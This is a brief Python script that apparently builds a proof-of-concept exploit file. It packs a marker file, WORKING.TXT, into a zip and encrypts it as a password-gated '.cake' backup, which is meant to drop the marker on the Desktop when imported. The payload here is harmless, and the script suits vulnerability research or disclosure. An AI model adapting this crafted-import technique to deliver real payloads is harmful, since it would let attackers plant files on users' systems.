#!/usr/bin/env python3
"""Build minimal .cake that drops Desktop/WORKING.TXT (password-gated).
Inner zip = single file WORKING.TXT with b'working'.
Outer = cake_backup V2 encrypt(password). No keychain/salt dependency for fire path.
"""
import os, sys, zipfile
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cake_backup_compat import encrypt_v2
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "importable", "WORKING.cake")
INNER = os.path.join(os.path.dirname(os.path.abspath(__file__)), "importable", "_working_inner.zip")
PASSWORD = "poc1234"
with zipfile.ZipFile(INNER, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("WORKING.TXT", b"working")
inner = open(INNER, "rb").read()
blob = encrypt_v2(PASSWORD, inner)
open(OUT, "wb").write(blob)
print(f"[+] {OUT} ({len(blob)} bytes) password={PASSWORD} inner={len(inner)}")
